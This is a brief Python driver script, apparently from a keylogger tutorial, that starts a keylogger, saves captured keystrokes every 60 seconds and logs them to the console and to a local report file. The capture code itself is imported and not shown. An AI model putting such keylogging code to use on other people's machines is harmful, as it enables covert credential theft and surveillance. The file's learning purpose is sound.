# https://www.thepythoncode.com/article/write-a-keylogger-python

import keylogger_logger
from keylogger import Keylogger

if __name__ == '__main__':
    keylogger = Keylogger().save_each(60)
    keylogger.attach_logger(keylogger_logger.DebugLogger())
    keylogger.attach_logger(keylogger_logger.FileLogger('./keylogger-report.txt'))
    keylogger.wait()